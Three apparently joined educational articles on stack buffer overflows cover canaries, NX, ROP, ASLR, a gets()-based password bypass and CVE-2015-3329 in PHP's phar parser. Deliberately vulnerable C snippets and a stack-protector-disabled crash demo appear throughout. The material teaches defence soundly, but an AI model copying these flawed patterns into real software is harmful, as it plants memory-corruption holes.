the heyday of stack overflow attacks, and there are a lot of protections in place that prevent them from working as well now as they did back then. Some of these protections include stack canaries, Address Space Layout Randomization (ASLR), compiler warnings, and hardware changes to prevent execution of code on the stack. (Side note: For a historical discussion on ASLR on Windows, see this most excellent Twitter thread by John Lambert .) First and foremost, the best defense against stack-based overflow attacks is the use of secure coding practices—mostly through stopping the use of functions that allow for unbounded memory access and carefully calculating memory access to prevent attackers from modifying adjacent values in memory. Quite simply, if attackers can only access the memory of the variable they intend to change, they cannot affect code execution beyond the expectations of the developer and architect. Unfortunately, there are thousands of programs that implemented the unsafe, unbounded functions to access memory, and recoding all of them to meet secure coding practices is simply not feasible. For those legacy programs, operating system manufacturers implemented several mitigations to prevent poor coding practices that result in arbitrary code execution. We can see this in action somewhat in our example by toggling the protections and pushing further in our overflow. One quick change that compilers made in the immediate aftermath of the stack-based attacks was starting to include protections on important pieces of data, such as return addresses. Since most stack overflow attacks involved overflowing one data location and writing to another, the compiler placed a sacrificial known value between buffers and important data, then the program would check to see whether the sacrificial value had been changed before using the important data. If that value had been changed, it was likely that the important data was also altered, so execution would stop immediately. Since a change in these sacrificial values could be determined before malicious code execution would start, the values are known as “canaries.” If the canary was disturbed, exception code was executed and the program terminated. Now, stack canaries, by themselves, aren’t bulletproof, since there are a few ways to bypass them. One method is by finding the canary value through an unbounded read of memory or guessing. In some cases, canary values are static and predictable. Once attackers know the canary value, they can replace it in the overwrite. For this reason, canaries often contain characters that are difficult to send, such as “enter” (\\x0a) or “vertical tab” (\\x0b).“enter” While a challenge for the attacker, this reduces the entropy of the canary value and makes them easier to find in memory. To bypass the canary stack protections using the GNU Compiler Collection (GCC), upi must specific that you want the protections turned off, with the flag ‘‘-fno-stack-protection.’ To demonstrate, let’s compile the program without protections and pass it a large buffer. In this case, I am using a small inline perl script to generate a series of 90 instances of ‘a’ and pass that into the program example.elf: msfuser@ubuntu:~$ gcc -o example.elf -fno-stack-protector overwrite.c . . . msfuser@ubuntu:~$ perl -e 'print \"a\"x90' | ./example.elf SUCCESS! givenPassword: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa realPassword: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Segmentation fault (core dumped) This resulted in a program crash, which is expected when memory structures are corrupted with bad data. This is likely the result of overwriting the return value, and then the processor crashing when trying to access the new memory. If we’d overwritten the location with somewhere that the CPU could access, it would have been happy to do so. Now let’s redo the experiment, but without disabling the gcc stack protections: msfuser@ubuntu:~$ gcc -o example.elf overwrite.c overwrite.c: In function ‘main’: . . . msfuser@ubuntu:~$ perl -e 'print \"a\"x90' | ./example.elf FAILURE! givenPassword: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa realPassword: ddddddddddddddd *** stack smashing detected ***: ./example.elf terminated Aborted (core dumped) msfuser@ubuntu:~$ Changes to hardware and operating systems took longer, but they did happen. One of the first mitigations introduced by hardware and operating system vendors was the NX, or no-execute bit. On Windows, this was known as Data Execution Prevention (DEP). It allowed operating systems to define certain areas of memory as non-executable, and when flagged as such, the CPU would simply not execute that memory. In theory, there should never be executable code on the stack, as it is designed for storing data values only. Based on that understanding, operating systems classified the stack as non-executable, preventing arbitrary code from being placed on the stack and executed. In addition to bypasses for this mitigation, it quickly became apparent that despite being a poor practice, multiple legitimate programs placed instructions on the stack and executed them, and NX broke them all. That forced operating systems to allow some programs to opt out of the protection, and those programs were well-known to hackers and continued to be targeted. Aside from those programs that opted out, the most common bypass for NX was through the use of return-oriented programming (ROP) , which leverages pre-existing code in instructional memory to perform desired tasks. Most programs use common sets of code to perform tasks, and ROP leverages this common code to perform a desired task. Sometimes, attackers set up execution of several sections of code across multiple libraries in a process known as ROP chaining. Since the code the attacker needed was already present in instructional memory, there was no need to place it on the stack for execution. Download Rapid7's Annual Vulnerability Intelligence Report ▶︎ In an effort to stop ROP-based attacks, operating systems started to randomize the location of instructional memory to prevent attackers from knowing where desired code was stored. That randomization of instructional memory is called ASLR, which shuffles blocks of memory and makes it so that the location of a given object (including code) in memory is no longer a constant value. An attack that works once may not work again, as the code the attacker tried to execute might no longer be there, causing unpredictable results. While effective, ASLR is constrained because, like NX, not every piece of instructional memory responds well to moving, so some code must opt out of the protection. Even for code that can handle ASLR, there are bypasses. The most common bypass leverages the limitation that the memory can only be randomized in blocks. If there is a way to determine where a block of memory is, an attacker can calculate the location of the desired memory from the leaked value. Unfortunately, since ASLR was not something that was baked into operating systems, they sometimes store the randomized location of something important in a known place, not unlike an employee choosing a good password but putting it on a Post-It note under their keyboard. Such a “cheat” by the operating system allows attackers to determine the location of a known object in memory, and then based on its location, they can calculate the location of the desired code or object. Again, just like NX, ASLR does not completely prevent an attack, but it does make attacks harder and less predictively successful. In conclusion It would be nice to say that stack-based overflow attacks are gone due to the mitigation strategies in place, but that is simply not the case. Stack-based attacks might not be as common today, but they do exist. Due to the large size of operating system vendors, it is unlikely that a stack-based attack exists in Windows or Linux anymore, but smaller groups that pay less attention to security still release vulnerable code—and not every vulnerability can be mitigated by the operating system.

Learn About Buffer Overrun Vulnerabilities, Exploits & Attacks Reading Time: 5 min(s) What Is a Buffer Overflow? Learn About Buffer Overrun Vulnerabilities, Exploits & Attacks A buffer overflow, or buffer overrun, is a common software coding mistake that an attacker could exploit to gain access to your system. To effectively mitigate buffer overflow vulnerabilities, it is important to understand what buffer overflows are, what dangers they pose to your applications, and what techniques attackers use to successfully exploit these vulnerabilities. State of Software Security 2023 Read the Report Key Concepts of Buffer Overflow This error occurs when there is more data in a buffer than it can handle, causing data to overflow into adjacent storage. This vulnerability can cause a system crash or, worse, create an entry point for a cyberattack. C and C++ are more susceptible to buffer overflow. Secure development practices should include regular testing to detect and fix buffer overflows. These practices include automatic protection at the language level and bounds-checking at run-time. Veracode’s binary SAST technology identifies code vulnerabilities, such as buffer overflow, in all code — including open source and third-party components —so that developers can quickly address them before they are exploited. Definition of a Buffer Overflow A buffer is a sequential section of memory allocated to contain anything from a character string to an array of integers. A buffer overflow, or buffer overrun, occurs when more data is put into a fixed-length buffer than the buffer can handle. The extra information, which has to go somewhere, can overflow into adjacent memory space, corrupting or overwriting the data held in that space. This overflow usually results in a system crash, but it also creates the opportunity for an attacker to run arbitrary code or manipulate the coding errors to prompt malicious actions. Many programming languages are prone to buffer overflow attacks. However, the extent of such attacks varies depending on the language used to write the vulnerable program. For instance, code written in Perl and JavaScript is generally not susceptible to buffer overflows. However, a buffer overflow in a program written in C, C++, Fortran or Assembly could allow the attacker to fully compromise the targeted system. Executing a Buffer Overflow Attack Cybercriminals exploit buffer overflow problems to alter the execution path of the application by overwriting parts of its memory. The malicious extra data may contain code designed to trigger specific actions — in effect sending new instructions to the attacked application that could result in unauthorized access to the system. Hacker techniques that exploit a buffer overflow vulnerability vary per architecture and operating system. Buffer Overflow Causes Coding errors are typically the cause of buffer overflow. Common application development mistakes that can lead to buffer overflow include failing to allocate large enough buffers and neglecting to check for overflow problems. These mistakes are especially problematic with C/C++, which does not have built-in protection against buffer overflows. Consequently, C/C++ applications are often targets of buffer overflow attacks. Buffer Overflow Attack Example [Adapted from “Buffer Overflow Attack Explained with a C Program Example,” Himanshu Arora, June 4, 2013, The Geek Stuff ] In some cases, an attacker injects malicious code into the memory that has been corrupted by the overflow. In other cases, the attacker simply takes advantage of the overflow and its corruption of the adjacent memory. For example, consider a program that requests a user password in order to grant the user access to the system. In the code below, the correct password grants the user root privileges. If the password is incorrect, the program will not grant the user privileges. printf (\"\\n Correct Password \\n\"); pass = 1; } if(pass) { /* Now Give root or admin rights to user*/ printf (\"\\n Root privileges given to the user \\n\"); } return 0; However, there is a possibility of buffer overflow in this program because the gets() function does not check the array bounds. Here is an example of what an attacker could do with this coding error: $ ./bfrovrflw Enter the password : hhhhhhhhhhhhhhhhhhhh Wrong Password Root privileges given to the user In the above example, the program gives the user root privileges, even though the user entered an incorrect password. In this case, the attacker supplied an input with a length greater than the buffer can hold, creating buffer overflow, which overwrote the memory of integer “pass.” Therefore, despite the incorrect password, the value of “pass” became non zero, and the attacker receives root privileges. Buffer Overflow Solutions To prevent buffer overflow, developers of C/C++ applications should avoid standard library functions that are not bounds-checked, such as gets, scanf and strcpy. In addition, secure development practices should include regular testing to detect and fix buffer overflows. The most reliable way to avoid or prevent buffer overflows is to use automatic protection at the language level. Another fix is bounds-checking enforced at run-time, which prevents buffer overrun by automatically checking that data written to a buffer is within acceptable boundaries. Veracode Helps Identify Buffer Overflows Veracode’s cloud-based service identifies code vulnerabilities, such as buffer overflow, so that developers can address them before they are exploited. Unique in the industry, Veracode’s patented binary static application security testing (SAST) technology analyzes all code — including open source and third-party components — without requiring access to source code. SAST supplements threat modeling and code reviews performed by developers, finding coding errors and omissions more quickly and at lower cost via automation. It’s typically run in the early phases of the software development lifecycle because it’s easier and less expensive to fix problems before going into production deployment. SAST identifies critical vulnerabilities such as SQL injection , cross-site scripting (XSS) , buffer overflows , unhandled error conditions and potential back-doors. In addition, our binary SAST technology delivers actionable information that prioritizes flaws according to severity and provides detailed remediation information to help developers address them quickly.

By sending suitably crafted user inputs to a vulnerable application, attackers can force the application to execute arbitrary code to take control of the machine or crash the system. Buffer overflow vulnerabilities are caused by programmer mistakes that are easy to understand but much harder to avoid and protect against. Subscribe Your Information will be kept private . × Begin your DAST-first AppSec journey today. Request a demo What causes a buffer overflow? A buffer overflow occurs when a program tries to write too much data into the buffer. This can cause the program to crash or to execute arbitrary code. Buffer overflow vulnerabilities exist only in low-level programming languages such as C with direct access to memory. However, they also affect the users of high-level web languages because the frameworks are often written in low-level languages. The idea of a buffer overflow vulnerability (also known as a buffer overrun ) is simple. The following is the source code of a C program that has a buffer overflow vulnerability: char greeting[5]; memcpy(greeting, \"Hello, world!\\n\", 15); printf(greeting); What do you think will happen when we compile and run this vulnerable program? The answer may be surprising: anything can happen. When this code snippet is executed, it will try to put fifteen bytes into a destination buffer that is only five bytes long. This means that ten bytes will be written to memory addresses outside of the array. What happens later depends on the original content of the overwritten ten bytes of memory. Maybe important variables were stored there and we have just changed their values? The example above is broken in such an obvious way that no sane programmer would make such a mistake. So let’s consider another example. Let’s suppose that we need to read an IP address from a file. We can do it using the following C code: #include <stdio.h> #define MAX_IP_LENGTH 15 int main(void) { char file_name[] = \"ip.txt\"; FILE *fp; fp = fopen(file_name, \"r\"); char ch; int counter = 0; char buf[MAX_IP_LENGTH]; while((ch = fgetc(fp)) != EOF) { buf[counter++] = ch; } buf[counter] = '\\0'; printf(\"%s\\n\", buf); fclose(fp); return 0; } A mistake in the above example is not so obvious. We assume that the IP address, which we want to read from a file, will never exceed 15 bytes. Proper IP addresses (for example, 255.255.255.255 ) can’t be longer than 15 bytes. However, a malicious user can prepare a file that contains a very long fake string instead of an IP address (for example, 19222222222.16888888.0.1 ). This string will cause our program to overflow the destination buffer. If you think that even this bug is too obvious and that no programmer would make such a mistake, stay tuned. Further on, you will see a real-life example of a buffer overflow bug which occurred in a serious project and is not much more sophisticated than the above example. Stack buffer overflow attack example Now that we know a program can overflow an array and overwrite a fragment of memory that it should not overwrite, let’s see how this can be used to mount a buffer overflow attack. In a typical scenario (called stack buffer overflow ), the problem is caused – like so many problems in information security – by mixing data (meant to be processed or displayed) with commands that control program execution. In C, like in most programming languages, programs are built using functions. Functions call each other, pass arguments to each other, and return values. For instance, our code, which reads an IP address from a file, could be part of a function called readIpAddress , which reads an IP address from a file and parses it. This function could be called by some other function, for example, readConfiguration . When readConfiguration calls readIpAddress , it passes a filename to it and then the readIpAddress function returns an IP address as an array of four bytes. Fig. 1. The arguments and the return value of the readIpAddress function During this function call, three different pieces of information are stored side-by-side in computer memory. For each program, the operating system maintains a region of memory which includes a part called the stack or call stack (hence the name stack buffer overflow ). When a function is called, a fragment of the stack is allocated to it. This piece of the stack (called a frame ) is used to: Remember the line of code from which program execution should resume when function execution completes (in our case, this will be a specific line in the readConfiguration function) Store the arguments passed to the function by its caller (in our case, let’s assume /home/someuser/myconfiguration/ip.txt ) Store the return value that the function returns to its caller (in our case, it’s a four-byte array, let’s say (192, 168, 0, 1) ) Store local variables of the called function while this function is being executed (in our case, the variable char[MAX_IP_LENGTH] buf ) So if a program has a buffer allocated in the stack frame and tries to insert more data than can fit there, user input data may spill over and overwrite the memory location where the return address is stored. Fig. 2. Contents of the stack frame when the readIPAddress function is called If the problem was caused by random malformed user input data, the new return address most likely will not point to a memory location where any other program is stored, so the original program will simply crash. However, if the data is carefully prepared, it may lead to unintended code execution. The first step for the attacker is to prepare special data that can be interpreted as executable code and will work for the attacker’s benefit (this is called a shellcode ). The second step is to place the address of this malicious data in the exact location where the return address should be. Fig. 3. The content of ip.txt overwrites the return address In effect, when the function reads the IP character string and places it into the destination buffer, the return address is replaced by the address of the malicious code. When the function ends, program execution jumps to malicious code. Can you prevent buffer overflows? Since the discovery of the stack buffer overflow attack technique, authors of operating systems (Linux, Microsoft Windows, macOS, and others) have been trying to find prevention techniques: The stack can be made non-executable, so even if malicious code is placed in the buffer, it cannot be executed. The operating system may randomize the memory layout of the address space (memory space). When malicious code is then placed in a buffer, the attacker cannot predict its address. Other protection techniques (for example, StackGuard) modify a compiler in such a way that each function calls a piece of code that makes sure the return address has not changed. In practice, even if such protection mechanisms make stack buffer overflow attacks harder, they don’t make them impossible. Some of these measures may also affect performance. Buffer overflow vulnerabilities exist in programming languages which, like C, trade security for efficiency and do not check memory access. In higher-level programming languages (e.g. Python, Java, PHP, JavaScript or Perl), which are often used to build web applications, buffer overflow vulnerabilities cannot exist. In these languages, you simply cannot put excess data into the destination buffer. For example, try to compile and execute the following piece of Java code: int[] buffer = new int[5]; buffer[100] = 44; The Java compiler will not warn you, but the runtime Java virtual machine will detect the problem and instead of overwriting random memory, it will interrupt program execution. Buffer overflows and the Web However, even programmers who use high-level languages should know and care about buffer overflow attacks. Their programs are often executed within operating systems that are written in C or use runtime environments written in C, and this C code may be vulnerable to such attacks. In order to see how a buffer overflow vulnerability may affect a programmer using such a high-level programming language, let’s analyze CVE-2015-3329 – a real-life security vulnerability discovered in the PHP standard library in 2015. A PHP application is a collection of *.php files. In order to make it easier to distribute such an application, it may be packed into a single file archive – as a zip file, a tar file, or using a custom PHP format called phar . A PHP extension called phar contains a class that you can use to work with such archives. With this class, you can parse an archive, list its files, extract the files, etc. Using this class is quite simple. For example, to extract all files from an archive, use the following code: $phar = new Phar('phar-file.phar'); $phar->extractTo('./directory'); When the Phar class parses an archive (that’s new Phar('phar-file.phar') ), it reads all filenames from the archive, concatenates each filename with the archive filename, and then calculates the checksum. For example, for an archive called myarchive.phar that contains files index.php and components/hello.php , the Phar class calculates checksums of two strings: myarchive.pharindex.php and myarchive.pharcomponents/hello.php . The reason why the authors implemented it this way is not important here – what is important is how they implemented it. Until 2015, this operation was done using the following function (see the old PHP source code ): phar_set_inode(phar_entry_info *entry TSRMLS_DC) /* {{{ */ { char tmp[MAXPATHLEN]; int tmp_len; tmp_len = entry->filename_len + entry->phar->fname_len; memcpy(tmp, entry->phar->fname, entry->phar->fname_len); memcpy(tmp + entry->phar->fname_len, entry->filename, entry->filename_len); entry->inode = (unsigned short)zend_get_hash_value(tmp, tmp_len); } As you can see, this function creates a char array of called tmp . First, the name of the phar archive (in our example, myarchive.phar ) is copied into this array using the following command: memcpy(tmp, entry->phar->fname, entry->phar->fname_len); In this command: The first argument, tmp , is a destination where bytes should be copied. The second argument, entry->phar->fname , is a source from where bytes should be copied – in our case, the filename of the archive ( myarchive.phar ). The third argument, entry->phar->fname_len , is a number of bytes that should be copied – in our case it is the length (in bytes) of the archive filename. The function copies the filename (in our example, index.php or components/hello.php ) into the tmp char array using the following command: memcpy(tmp + entry->phar->fname_len, entry->filename, entry->filename_len); In this command: The first argument, tmp + entry->phar->fname_len , is a destination where bytes should be copied – in our case, it is a location in the tmp array just after the end of the archive filename. The second argument, entry->filename , is a source from where bytes should be copied. The third argument, entry->filename_len , is a number of bytes that should be copied. Then the zend_get_hash_value function is called to calculate the hashcode. Notice how the size of the buffer is declared: char tmp[MAXPATHLEN]; It has a size of MAXPATHLEN , which is a constant defined as the maximum length of a filesystem path on the current platform. The authors assumed that if they concatenate the filename of the archive with the name of a file inside the archive, they will never exceed the maximum allowed path length. In normal situations, this assumption is met. However, if the attacker prepares an archive with unusually long filenames, a buffer overflow is imminent. The function phar_set_inode will cause an overflow in the tmp array. An attacker can use this to crash PHP (causing a denial of service) or even make it execute malicious code. The problem is similar to our simple example from above – the programmer made a simple mistake, trusted user input too much, and assumed that the data will always fit in a fixed-size buffer. Fortunately, this vulnerability was discovered in 2015 and fixed . How to avoid buffer overflow vulnerabilities Programmers can mitigate the risk of buffer overflow attacks by always validating user input length. However, a good general way to avoid buffer overflow vulnerabilities is to stick to using safe functions that include buffer overflow protection (which memcpy does not). Such functions are available on different platforms, for example, strlcpy , strlcat , snprintf (OpenBSD) or strcpy_s , strcat_s , sprintf_s (Windows).
